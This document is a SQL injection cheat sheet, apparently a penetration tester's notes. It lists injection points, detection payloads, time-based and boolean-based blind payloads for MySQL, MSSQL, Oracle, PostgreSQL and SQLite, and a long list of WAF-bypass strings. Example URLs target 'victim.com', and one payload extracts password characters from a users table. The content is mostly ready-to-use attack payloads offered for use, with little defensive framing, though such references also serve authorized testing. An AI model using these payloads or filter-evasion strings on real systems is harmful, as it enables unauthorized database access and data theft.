SQL Injection (SQLi) is a critical web vulnerability where an attacker manipulates SQL queries by injecting malicious input into an application's database query. This can lead to unauthorized data access, data leakage, or even complete database compromise.

## Where to test:

* GET parameters
* POST body
* Headers (e.g., User-Agent, Referer, X-Forwarded-For)
* Cookies
* Hidden fields
* JSON/XML in API requests

  
**Quick Detection Payloads:**
```
' → does error show?
"
' or 1=1--
' and sleep(5)--
' and (select 1 from dual where 1=1)-- (Oracle)
```

# How to Identify SQLi Types:

### Error-Based SQL Injection

Test Payloads:
```
'         
"        
')         
" OR 1=1--  
' ORDER BY 100--  
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) a)-- 
```

You see SQL error messages like:

* You have an error in your SQL syntax
* Warning: mysql_fetch_assoc()
* Unclosed quotation mark after the character string
* ORA-00933: SQL command not properly ended

IF Blocked:
Try Below Techniques:
```
%27  (URL encoded ')
%22  (URL encoded ")
/**/ (inline comment to bypass filters)
/*!SELECT*/  (MySQL comment bypass)
```
## Time-Based Blind SQL Injection

### MySQL
 ```
' AND SLEEP(5)--  
" AND SLEEP(5)--  
1 AND SLEEP(5)--  
' OR IF(1=1, SLEEP(5), 0)--  
' AND (SELECT * FROM users LIMIT 1) AND SLEEP(5)--  

 ```
### MSSQL (Microsoft SQL Server)
 ```
' WAITFOR DELAY '0:0:5'--  
" WAITFOR DELAY '0:0:5'--  
1; WAITFOR DELAY '0:0:5'--  
'; IF (1=1) WAITFOR DELAY '0:0:5'--  
'; SELECT CASE WHEN (1=1) THEN WAITFOR DELAY '0:0:5' ELSE NULL END--  

 ```
### Oracle
```
 ' AND 1=1 AND dbms_pipe.receive_message('a',5)--  
' OR 1=1 AND dbms_pipe.receive_message('a',5)--  
' OR dbms_lock.sleep(5) FROM dual--  
' AND (SELECT CASE WHEN 1=1 THEN dbms_lock.sleep(5) ELSE null END FROM dual)--  
```
### PostgreSQL
```
'; SELECT pg_sleep(5)--  
1 AND pg_sleep(5)--  
' OR pg_sleep(5)--  
' OR (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--  
' OR 1=(SELECT 1 FROM pg_sleep(5))--
```
### SQLite
```
' AND randomblob(1000000000)--  
' OR (SELECT load_extension('non_existing'))--  # causes crash or delay
' AND (SELECT COUNT(*) FROM sqlite_master, sqlite_master, sqlite_master)--  
```

# Boolean-Based Blind SQL Injection

Test Payloads:
```
' AND 1=1--          → should behave normally (TRUE)
' AND 1=2--          → should behave differently (FALSE)

" AND 1=1--         
" AND 1=2--         

' OR '1'='1'--       → TRUE
' OR '1'='2'--       → FALSE

1 AND 1=1           
1 AND 1=2           
```

 If blocked:
**Try encoding:**
``
%27 AND 1=1--  
%27 AND 1=2--  
``
**Use case-insensitive logic:**
``
' oR 1=1--  
``
**Try comment tricks:**
``
' AND/**/1=1--  
``



Bypassing WAF: Blind SQL Injection Using logical requests AND/OR • The following requests allow one to conduct a successful attack for many WAFs

``` 
/?id=1+OR+0x50=0x50 (HEX)
/?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 (ASCII-Based-Boolean-Check)

```
# WAF Bypassing Strings

```
` /!%55NiOn/ /!%53eLEct/
%55nion(%53elect 1,2,3)– -
+union+distinct+select+
+union+distinctROW+select+
///!12345UNION SELECT///
concat(0x223e,@@version)
concat(0x273e27,version(),0x3c212d2d)
concat(0x223e3c62723e,version(),0x3c696d67207372633d22)
concat(0x223e,@@version,0x3c696d67207372633d22)
concat(0x223e,0x3c62723e3c62723e3c62723e,@@version,0x3c696d67207372633d22,0x3c62​723e)
concat(0x223e3c62723e,@@version,0x3a,”BlackRose”,0x3c696d67207372633d22)
concat(‘’,@@version,’’)
///!50000UNION SELECT///
//UNION///!50000SELECT///
/!50000UniON SeLeCt/
union /!50000%53elect/
+#uNiOn+#sEleCt
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/!%55NiOn/ /!%53eLEct/
/!u%6eion/ /!se%6cect/
+un//ion+se//lect
uni%0bon+se%0blect
%2f%2funion%2f*%2fselect
union%23foo%2Fbar%0D%0Aselect%23foo%0D%0A
REVERSE(noinu)+REVERSE(tceles)
/–/union/–/select/–/
union (/!/*/ SeleCT */ 1,2,3)
/!union/+/!select/
union+/!select/
//union//select//
//uNIon//sEleCt//
///*!union*////!select///
/*!uNIOn*/ /*!SelECt*/
+union+distinct+select+
+union+distinctROW+select+
+UnIOn%0d%0aSeleCt%0d%0a
UNION/*&test=1*/SELECT/*&pwn=2*/
un?+un//ion+se//lect+
+UNunionION+SEselectLECT+
+uni%0bon+se%0blect+
%252f%252a*/union%252f%252a /select%252f%252a*/
/%2A%2A/union/%2A%2A/select/%2A%2A/
%2f%2funion%2f%2fselect%2f%2f
union%23foo%2Fbar%0D%0Aselect%23foo%0D%0A
/!UnIoN*/SeLecT+`
```
## Bypass with Comments
SQL comments allow us to bypass a lot of filtering and WAFs.

`
Code :
 http://victim.com/news.php?id=1+un/**/ion+se/**/lect+1,2,3--
`
## Case Changing
Some WAFs filter only lowercase SQL keyword.
Regex Filter: /union\sselect/g
`
http://victim.com/news.php?id=1+UnIoN/**/SeLecT/**/1,2,3--
`

References:

https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
https://portswigger.net/web-security/sql-injection/cheat-sheet
https://owasp.org/www-community/attacks/SQL_Injection
https://portswigger.net/support/sql-injection-bypassing-common-filters
https://code.google.com/archive/p/teenage-mutant-ninja-turtles/wikis/BasicObfuscation.wiki
https://johnermac.github.io/notes/ewptx/sqlievasion/
